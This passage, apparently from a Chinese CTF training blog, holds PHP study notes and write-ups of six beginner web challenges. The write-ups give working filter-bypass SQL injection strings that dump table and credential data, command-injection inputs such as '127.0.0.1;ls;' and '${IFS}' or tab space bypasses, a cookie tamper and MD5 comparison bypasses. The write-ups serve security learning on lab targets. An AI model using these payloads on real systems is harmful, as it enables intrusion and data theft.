</font><font style="color:#000000;">false </font><font style="color:#000000;">] ) </font></li><li><font style="color:#000000;">name：必选参数，常量名称，即标志符。 </font></li><li><font style="color:#000000;">value：必选参数，常量的值。 </font></li><li><font style="color:#000000;">case_insensitive：可选参数，如果设置为 </font><font style="color:#000000;">TRUE</font><font style="color:#000000;">，该常量则大小写不敏感，默认是大小写敏感的</font></li></ul></li><li><font style="color:#000000;">GLOBALS： </font><ul><li><font style="color:#000000;">$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。 </font></li><li><font style="color:#000000;">$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</font></li></ul></li><li><font style="color:#000000;">$_SERVER：</font><font style="color:#000000;"> </font><ul><li><font style="color:#000000;">1$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建</font></li></ul></li><li><font style="color:#000000;">$_POST： </font></li></ul><p><font style="color:#000000;">$_POST 来收集表单中的 </font><font style="color:#000000;">input </font><font style="color:#000000;">字段数据</font></p><ul><li><font style="color:#000000;">extract： </font><ul><li><font style="color:#000000;">extract </font><font style="color:#000000;">函数可以将数组中的元素导入到当前作用域中作为变量。如果数组中的键与当前作用域中已有的变量名相同，可能会导致变量覆盖。</font></li></ul></li><li><font style="color:#000000;">list</font><font style="color:#000000;">： </font><ul><li><font style="color:#000000;">list() </font><font style="color:#000000;">函数用于将数组中的值赋给一组变量</font></li></ul></li><li><font style="color:#000000;">parse_str</font><font style="color:#000000;">： </font><ul><li><font style="color:#000000;">parse_str() </font><font style="color:#000000;">函数用于解析 URL 查询字符串，并将其中的参数赋值给相应的变量</font></li></ul></li><li><font style="color:#000000;">compact</font><font style="color:#000000;">： </font><ul><li><font style="color:#000000;">compact() </font><font style="color:#000000;">函数用于将多个变量转换为关联数组，其中变量名将成为数组的键，变量的值将成为数组的值</font></li></ul></li><li><font style="color:#000000;">var_dump： </font><ul><li><font style="color:#000000;"></font><font style="color:#000000;">var_dump是一个调试函数，用于输出变量的详细信息，包括类型和值。 </font></li><li><font style="color:#000000;"></font><font style="color:#000000;">它可以用于调试目的，帮助开发者了解变量的结构和内容</font></li></ul></li><li><font style="color:#000000;">basename() 函数用于返回路径中的文件名部分。它可以用于确保文件名只包含合法的字符，并且不包含路径信息。</font></li><li><font style="color:#000000;">preg_replace():</font><ul><li><font style="color:#000000;">preg_replace() 函数可以使用正则表达式替换文件名中的不合法字符。通过使用适当的正则表达式，可以从文件名中去除非法字符或将它们替换为其他字符。</font></li></ul></li><li><font style="color:#000000;"></font><font style="color:#000000;">str_replace(): </font><ul><li><font style="color:#000000;">str_replace() 函数可以用于简单的字符串替换。虽然不如正则表达式强大，但在某些情况下也可以用来去除特定字符</font></li></ul></li><li><font style="color:#000000;">filter_var(): </font><ul><li><font style="color:#000000;">filter_var() 函数可以用于过滤文件名中的非法字符。使用FILTER_SANITIZE_STRING 过滤器可以删除文件名中的非法字符。</font></li></ul></li><li><font style="color:#000000;"></font><font style="color:#000000;">pathinfo() ： </font><ul><li><font style="color:#000000;">pathinfo() 函数可以用于获取文件路径的信息，包括文件名、目录名和文件扩展名（后缀）等。通过 </font></li><li><font style="color:#000000;">pathinfo() 获取文件后缀，并与允许的后缀列表进行比较。</font></li></ul></li><li><font style="color:#000000;">strtolower() ： </font><ul><li><font style="color:#000000;">在检查文件后缀时，为了避免大小写问题，通常会将后缀转换为小写（或大写）后再进行比较。</font></li></ul></li><li>include()<ul><li><font style="color:rgb(17, 17, 17);">将外部文件引入到当前的 PHP脚本中</font></li></ul></li></ul><h2 id="FMVTQ"><font style="color:#000000;">（二）php基础2</font></h2>芝士~链接：[https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP2.pdf](https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP2.pdf)<ul><li>类与对象等参考C语言</li><li><font style="color:rgb(65,70,75);">__construct() </font><ul><li><font style="color:rgb(65,70,75);">实例化类时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">__destruct() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">类对象使用结束时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__set() </font><ul><li><font style="color:rgb(65,70,75);">在给未定义的属性赋值时自动调用 </font><font style="color:rgb(78,90,112);"> </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__get() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">调用未定义的属性时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__isset() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">使用 isset() 或 empty() 函数时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__unset() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">使用 unset() 时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__sleep() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">使用 serialize 序列化时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__wakeup() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">使用 unserialize 反序列化时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__call() </font><ul><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">调用一个不存在的方法时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__callStatic() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">调用一个不存在的静态方法时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__toString() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">把对象转换成字符串时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__invoke() </font><ul><li><font style="color:rgb(65,70,75);">当尝试把对象当方法调用时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">__set_state() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">当使用 var_export() 函数时自动调用，接受一个数组参数 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__clone() </font><ul><li><font style="color:rgb(65,70,75);">当使用 clone 复制一个对象时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__debugInfo() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">使用 var_dump() 打印对象信息时自动调用 </font></li></ul></li><li><font style="color:rgb(78,90,112);"> </font><font style="color:rgb(65,70,75);">__autoload() </font><ul><li><font style="color:rgb(78,90,112);"></font><font style="color:rgb(65,70,75);">尝试加载未定义的类 </font></li></ul></li></ul><h1 id="zCbbR"><font style="color:#000000;">二、写题</font></h1><h2 id="dUtaa"><font style="color:#000000;">（一）[极客大挑战 2019]BabySQL</font></h2><font style="color:#000000;">先尝试万能密码</font><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736519153630-3f9a91f6-5930-432d-843d-9c9180015499.png"></p><p><font style="color:#000000;">不出所料，不是那道签到题，96dfc323c6b7d07e82ed08e6d01a894a试了用任何方法都解不开，都是乱码，万能密码用不了</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736519454073-4830fa0b-c9f3-425b-a36c-9bd766d4f375.png"></p><p><font style="color:#000000;">这个万能密码方法只能放弃，毕竟这道题考的是sql注入，不可能这么简单</font></p><p><font style="color:#000000;">尝试随便输入几个</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520392251-21c4c17d-fe43-46b9-8a79-3a867c9c6034.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520505981-6ed42089-1ca3-4b02-ab1c-25d7387bfe5c.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520608655-72edbb33-ca11-428d-bafa-647480e19912.png"></p><p><font style="color:#000000;">结果都是这个</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520392150-58da92eb-8bc6-4bbc-b908-ed8dcfe1de5d.png"></p><p><font style="color:#000000;">到输入这个的时候出现了下面的报错信息，至少让我们知道了sql的闭合条件’1’’’，去掉左右两边的单引号得到1’’，再去掉1’,得到闭合体条件就是一个单引号’</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520524012-d7fb9d7e-c2bd-4d66-a0ad-f99b1764dd5c.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736520534822-8a7e9851-84e7-48f3-a970-2b4012c4d20d.png"></p><p><font style="color:#000000;">经过测试，它把and省略掉了，说明这个网站会过滤掉某些字符</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521103444-0e2e263c-056b-4a10-9954-72bf7e94432d.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521277904-65d84254-63bd-425d-966a-934bc60964a4.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521205065-c77c84b8-a7b3-480a-99e9-5776a5e7c6ca.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521114846-b0a75543-dd8a-48cf-b2b2-ca60d4b56eed.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521304292-3bee407e-af8f-4c53-9396-e57bf7bdb0ab.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736521220484-446bfc28-0ea6-40a5-b748-9c88b02985f8.png"></p><p><font style="color:#000000;">试了一下，还把or过滤掉了</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736567900542-4a4d10ff-c5a6-4de3-abd4-fd43ca40c705.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736567932240-cc1ff621-6f17-4b6b-8258-2be8bbe9b59b.png"></p><p><font style="color:#000000;">尝试用一下burp看一下还有那些字符被过滤了</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736570755954-87553241-8e6b-4ea9-9749-cfc715cb6b72.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736570742161-55d79597-14f5-459f-a314-5c7bb6dc3a19.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736570732309-014ac547-ae41-48d9-b00f-28fda3811180.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736570728596-5f58e1bb-312d-49aa-8f00-b4830df71556.png"><font style="color:#000000;">and、And、AND、ANd、by、BY、or、Or、select、SELECT、insert、insERT、INSERT、where、+、sleep、SLEEp、union、UNION、drop、DROP、mid、from、count……等字符被过滤了，且字符不分大小写但是啊，双写如anandd、selselectect、ununionion、whwhereere等就绕过去了，</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571025057-d8e7e060-5e5f-485f-8d99-aeeb43b0d5db.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571026890-59355c8d-c555-43e4-bcd4-58757470bf55.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571090148-63ec76b1-357e-4277-a39a-9d1cb7976abf.png"></p><p><font style="color:#000000;">接下来看一下,要判断字位数</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571733360-af3bdb3b-44af-4820-964f-f6aecc6b903c.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571741059-cf7f7486-c194-4765-9e75-f94acdea1077.png"></p><p><font style="color:#000000;">4出现unknown，和之前显示的不一样，说明字段数为3</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571769135-9ab9c1f0-8841-4c7e-87ac-3c58c6409f96.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736571776630-95fdea75-c3cc-44ff-966f-0a07e7e2cf17.png"></p><p><font style="color:#000000;">使用联合注入</font></p><p><font style="color:#000000;">用户名：1’ununionion seselectlect 1,2,3#       密码是：1</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736572113901-36411377-8a30-4941-8ee8-905bc02edbe5.png"></p><p><font style="color:#000000;">成功了，之后就是找他的数据库，发现2和3这两个位置可以注入，回显点位是2，3</font></p><p><font style="color:#000000;">接着找它的数据库，还是联合注入</font></p><p><font style="color:#000000;">用户名：1’ununionion seselectlect 1,database(),3#   密码是：1</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736572258483-0c5b5411-32b5-4219-9ffc-5b2c5c2c0039.png"></p><p><font style="color:#000000;">geek应该就是数据库名，接下来就是找表名了，还是联合注入，from和information中的or要双写</font></p><p><font style="color:#000000;">用户名为1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;’geek’#</font></p><p><font style="color:#000000;">密码为1</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736590234712-160235b2-a75f-492c-b189-bf1afc6962d5.png"></p><p><font style="color:#000000;">所以就找到表了，表名为：b4bsql,geekuser</font></p><p><font style="color:#000000;">接着就是查询表中的内容了，还是联合注入 </font></p><p><font style="color:#000000;">用户名：1’ uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’b4bsql’# </font></p><p><font style="color:#000000;">密码：1</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736593552367-1e0e30ff-88ce-49ec-9d4e-d609bf518bd6.png"></p><p><font style="color:#000000;">得到该表中的字段信息，查询username和password的内容，注意password中间or需要双写</font></p><p><font style="color:#000000;">用户名：1’ uniunionon selselectect 1,group_concat(username),group_concat(passwoorrd) frfromom geek.b4bsql #</font></p><p><font style="color:#000000;">密码：1</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736594191337-c114b125-5926-4d37-ac5b-fda45e0a78b5.png"></p><p><font style="color:#000000;">拿到flag，结束游戏</font></p><h2 id="y6Muo"><font style="color:#000000;">（二）[SWPUCTF 2021 新生赛]finalrce</font></h2>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736597845911-dd49e667-6fd9-4238-a911-164066019025.png)<p><font style="color:#000000;">题目是一段PHP代码，需要绕过正则表达式。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736597837872-ce7eb4e7-b15e-4013-ad39-3ab3560043b2.png"><font style="color:#000000;">cat命令最常见的用法查看文本文件的内容。例如，查看一个名为 file.txt的文件，可以运行以下命令：</font></p><p><font style="color:#000000;">+cat file.txt</font></p><p><font style="color:#000000;">先看if里的内容，preg_match 函数用于执行一个正则表达式匹配，末尾的&#x2F;i说明</font><font style="color:#000000;"> 匹配不分大小写。读了代码后发现反斜杠和单引号都没有被注释掉，那么我们就可以利用这一点来绕过被禁止掉的命令当正则表达式没有过滤掉反斜杠或者单引号或者双引号，那么可以使用单引号或者双引号包裹命令（如：ls cat等）任意一个字符，只要他们不是一个整体就行，或者使用反斜杠插入到命令里面（如：ca\t  c\at等）即可实现绕过可以看到的是没有过滤”|“这个符号，然后exec执行是没有</font><font style="color:#000000;">回显</font><font style="color:#000000;">的.</font></p><p><font style="color:#000000;">这个题目是需要用linux的一个命令，”tee“将想要执行的命令写入到一个文件里面，然后再去访问这个文件，以此来执行这个命令</font><font style="color:#000000;">，简单来说，就是</font><font style="color:#000000;">从标准输入读取，再写入标准输出和文件。</font></p><p><font style="color:#000000;">所以：tee 1.txt：将输出复制一份并输出到终端窗口以及写入到名为1.txt的文件中</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736599306986-1873fd03-6d89-4152-9ca0-aaa34e757fc6.png"></p><p><font style="color:#000000;">输出重定向之后，看到有flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736599882646-79831275-e2c2-446f-9877-14b9a24d6972.png"></p><p><font style="color:#000000;">之后使用类似的命令，将flllllaaaaaaggggggg文件中的内容进行查询，</font><font style="color:#000000;">然后访问2.txt就可以拿到flag了</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736600117584-aceb6f22-110a-46ee-9f7d-06bc76a24846.png"></p><h2 id="JPgCw"><font style="color:#000000;">（三）[SWPUCTF 2021 新生赛]babyrce</font></h2>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736677463696-0a3fec3d-3233-4ede-b18a-6701e83d99d7.png)<p><font style="color:#000000;">进来之后发现有一串PHP代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736677471281-cc005a30-3a75-4bdf-b6c4-bd85e94edc59.png"></p><p><font style="color:#000000;">header查了资料</font><font style="color:#000000;">header() 函数向客户端发送原始的 HTTP 报头。</font></p><p><font style="color:#000000;">在这里的header（）的含义是：</font><font style="color:#000000;">header(“Content-Type:text&#x2F;html;charset&#x3D;utf-8”);&#96; 设置内容类型为 HTML ，并指定字符类型为 UTF-8。</font></p><p><font style="color:#000000;">接着看代码</font></p><p><font style="color:#000000;"> 如果’admin’ 的 cookie 值是否为1。如果是，它将包含（include）”..&#x2F;next.php” 文件，所以把请求中Cookie的值设置为1就可以拿到flag了</font></p><p><font style="color:#000000;">还有，小饼干(Small Cookies)，直接burp你</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736677880412-e08481dd-b47b-4ffa-a2fc-b2151d34ad25.png"></p><p><font style="color:#000000;">设置admin的cookie值为1</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736678140585-a5abd1e1-c69d-4974-80d1-4aa09bdb10c3.png"></p><p><font style="color:#000000;">出现了一个rasalghul.php文件</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736678203998-f7a4fa6d-da2e-4aa3-8e32-8b9b77771715.png"></p><p><font style="color:#000000;">访问一下又来了一串PHP代码，显然可见，这个PHP代码过滤掉了空格 </font></p><p><font style="color:#000000;">shell_exec($ip); 的作用是将用户输入直接传递给shell_exec()，执行系统命令，并将输出返回给用户。  </font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736678266831-d9b81fc2-d3a2-4b7c-b008-08427a812d61.png"></p><p><font style="color:#000000;">先用</font><font style="color:#000000;">Linux ls命令试试，输出当前目录下的文件列表  </font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736678408604-54185343-7288-4d2f-96e0-8a95231022ea.png"></p><p><font style="color:#000000;">试了下打开index.php文件，又回到开始了。</font></p><p><font style="color:#000000;"></font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736679462086-cc038d95-6155-4148-be06-75a648a1c23f.png"></p><p><font style="color:#000000;">可以看到，ls命令是有作用的，</font><font style="color:#000000;">我们可以看到很显眼的flag文件，,</font><font style="color:#000000;">所以我们只要能绕过空格限制，</font><font style="color:#000000;">使用cat命令查看,</font><font style="color:#000000;">就能够进行下一步了</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736678755188-25b63fdc-95a2-4405-b71d-f3f8dfdf6241.png"></p><p><font style="color:#000000;">查了资料，绕过空格的常用的方法为： </font></p><p><font style="color:#000000;">cat flag.txt </font></p><p><font style="color:#000000;">cat${IFS}flag.txt </font></p><p><font style="color:#000000;">cat$IFS$9flag.txt </font></p><p><font style="color:#000000;">cat&lt;flag.txt</font></p><p><font style="color:#000000;">cat&lt;&gt;flag.txt</font></p><p><font style="color:#000000;">所以传入?url&#x3D;cat${IFS}&#x2F;flllllaaaaaaggggggg得到flag</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736679016602-55b270e4-d284-462d-82be-bfaf809c448d.png"></p><h2 id="dbv7v"><font style="color:#000000;">（四）[ACTF2020 新生赛]Exec</font></h2>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736600651502-1dc7ff11-6cde-4def-aaec-df98566db4e3.png)<p><font style="color:#000000;">先尝试ping自己，没有flag，</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736600922279-794f0a33-4595-4c53-898c-fb15629a083d.png"></p><p><font style="color:#000000;">随便试了一下错的，丢包率100%，hhhhhh</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601054735-9b580b60-22dc-47d1-b46e-fdb9b33f7fd5.png"></p><p><font style="color:#000000;">试试看是否过滤了分号：127.0.0.1;ls;</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601142389-bb0bd8ea-4da3-436f-8bf9-f8aa615a508a.png"></p><p><font style="color:#000000;">发现没有过滤分号，但是呢，相比传入127.0.0.1，多了一个文件index.php，所以尝试切换到上一级目录看一下</font><font style="color:#000000;">接着我们就</font><font style="color:#000000;">遍历</font><font style="color:#000000;">目录了,通过cd …&#x2F;达到访问上一个目录的目的，再通过ls 达到查看该目录有哪些文件</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601320447-7b5f977b-f5bc-4a0d-8645-1d977b20f1a8.png"></p><p><font style="color:#000000;">没有什么信息，在往上看</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601397802-7559a93a-9a6d-4bfe-9cc6-2918882a265e.png"></p><p><del><font style="color:#000000;">没有什么信息，在往上看 </font></del><font style="color:#000000;"> 还往上看神马，flag不久在这里？抓住它不久行了吗？</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601426809-1f75dd15-ea2e-4f32-8ba7-15e502c97688.png"></p><p><font style="color:#000000;">找到flag：flag{9002c8ac-2096-4a00-b0a7-99b6d4c71fab}</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736601700499-2f2662cf-d7ed-42c6-b0e1-6138829ac0dc.png"></p><h2 id="J4csD"><font style="color:#000000;">（五）[SWPUCTF 2022 新生赛]webdog1__start</font></h2>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736604220579-3227a982-36ea-41d7-84a2-34742e380d36.png)<p><font style="color:#000000;">一进去灵魂提问，好好好</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736604234982-d64e3451-66a6-4876-b5fc-3e1afe8d2915.png"></p><p><font style="color:#000000;">查找网页源代码，发现这一段PHP代码，这个考的应该是md5绕过</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736604429725-619e999d-87e6-4b9a-8f38-0e1017e069c0.png"></p><p><font style="color:#000000;">想着用之前写题的思路，使用数组绕过，下面有一行小字发生了变化，拷问我How do you think?应该是错了，</font></p><p><font style="color:#000000;">MD5之后的数组返回值是</font><font style="color:#000000;">null</font><font style="color:#000000;">，肯定不等于</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736604613851-0b8949e7-559f-4f1e-b14a-9174d108402d.png"></p><p><font style="color:#000000;">变量等于md5的变量这里的思路是让他们都为0e来触发0e计数法接着相等</font></p><p><font style="color:#000000;">查了资料，自</font><font style="color:#000000;">身与md5相等</font><font style="color:#000000;">对于</font><font style="color:#000000;">0e215962017</font><font style="color:#000000;">，md5后也是以0e开头，可以尝试用它绕过</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736605472358-1d64ea8b-ed44-470f-a72b-df6d83109517.png"></p><p><font style="color:#000000;">看，成功了，出现一下的东西：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736605450990-344208fa-af2d-4f35-8abd-ca6f5e690f9c.png"></p><p><font style="color:#000000;">这里出现了很多链接，除了第一个链接是一篇文章，其余都是404</font></p><p><font style="color:#000000;">“Next”do you know the power of bot? go go go!!</font></p><p><font style="color:#000000;">“下一个”你知道机器人的力量吗？去吧，去吧！！</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736606576471-7f33ee31-d1f6-4a0b-827b-272963376f55.png"></p><p><font style="color:#000000;">去robots.txt的路径看一看，发现是一堆乱码</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736606663833-1e12b57c-6489-4d2c-af22-0e53360cce27.png"></p><p><font style="color:#000000;">乱码中夹杂着f14g.php</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736606776525-945c5e85-1fd9-496c-a2cf-4cdea7a1d98c.png"></p><p><font style="color:#000000;">有一个网址，看看</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736606809767-104bef09-9bc6-48ba-8e22-3aa891a94f0d.png"></p><p><font style="color:#000000;">好好好，弔图一张</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736606835633-5221608c-ff45-4729-a75e-4688520c2561.png"></p><p><font style="color:#000000;">那别怪我burp你了</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736607267463-e1dc1a6b-ad17-44ff-bd9f-c5e7e6be72b7.png"></p><p><font style="color:#000000;">找到F1l1l1l1l1lag.php文件，打开看一下还是PHP代码</font><font style="color:#000000;">是一段代码审计</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736607257872-f5efcdd0-f063-4a66-9d9c-c79ebd462700.png"></p><p><font style="color:#000000;">这里主要限制是过滤了flag和空格以及有18个字符的限制 </font></p><p><font style="color:#000000;">if(!strstr($get,” “))</font></p><p><font style="color:#000000;">检查 $get 中是否包含空格，如果包含，则直接拒绝。  </font></p><p><font style="color:#000000;">$get &#x3D; str_ireplace(“flag”, “ “, $get);</font></p><p><font style="color:#000000;"> 把输入中的字符串 flag（大小写不敏感）替换为空格。  </font></p><p><font style="color:#000000;">if (strlen($get) &gt; 18){</font></p><p><font style="color:#000000;">    die(“This is too long.”);}</font></p><p><font style="color:#000000;">如果输入的长度超过 18 个字符，终止代码。  </font></p><p><font style="color:#000000;">既然空格被过滤了，那我们可以尝试使用同为空白字符的制表符%09，代替空格</font></p><p><font style="color:#000000;">所以传入system(“cat%09&#x2F;f*”);</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736608441905-4811645c-ef74-479c-983b-2aa0cdd7f972.png"></p><p><font style="color:#000000;">拿到flag：NSSCTF{0cca4d05-2ad2-4a90-9897-dbe875454267}</font></p><p><font style="color:#000000;">这道题这个文章讲的很详细，有很多芝士~点可以学习：</font><a href="http://www.coreui.cn/news/171523.html"><font style="color:#000000;">http://www.coreui.cn/news/171523.html</font></a></p><h2 id="ZKRD6"><font style="color:#000000;">（六）[SWPUCTF 2022 新生赛]奇妙的MD5</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686453403-0cb6e2c2-3683-48f1-bb6d-019632b5d049.png)</h2><font style="color:#000000;">奇妙的字符串，又跟 MD5 有关，查了资料，找到了两个：</font><p><font style="color:#000000;">一个是</font><font style="color:#000000;"> </font><a href="https://so.csdn.net/so/search?q=MD5%20%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020"><font style="color:#000000;">MD5 加密</font></a><font style="color:#000000;">后弱比较等于自身，这个字符串是 0e215962017 ：</font></p><p><font style="color:#000000;">另一个是 MD5 加密后变成万能密码，这个字符串是 ffifdyop</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686622285-e564fb2b-6728-480b-98e7-718022292450.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686600148-eb6b0c70-9732-465a-bc42-ddae4118640e.png"></p><p><font style="color:#000000;">0e215962017不行，ffifdyop才出现这个页面</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686671383-9696db48-e3a7-4744-9e65-334339dfb219.png"></p><p><font style="color:#000000;">这不在源代码这里找吗？</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686747911-4aa0c775-fa2a-4279-87f3-89ab3141e5c7.png"></p><p><font style="color:#000000;">md5数组绕过</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686850333-4801d61e-d4af-465a-b069-b09edea0a415.png"></p><p><font style="color:#000000;">url出现了奇怪的东西</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686875495-cf956c22-70f2-466e-a2ea-1c55a0df8c15.png"></p><p><font style="color:#000000;">访问一下</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686915904-8d7cac2c-cfd0-4fb0-b595-bec766a3fba7.png"></p><p><font style="color:#000000;">同样数组绕过，拿到flag：</font><font style="color:#000000;">NSSCTF{d2e1d7ef-32ab-4d1c-a1e2-0ea1349d610d}</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736686988086-efe48298-c369-4689-a3a6-cb8780a02532.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习及练习</title>
      <link href="/2024/12/02/HelloWeb/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/12/02/HelloWeb/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0/</url>
      
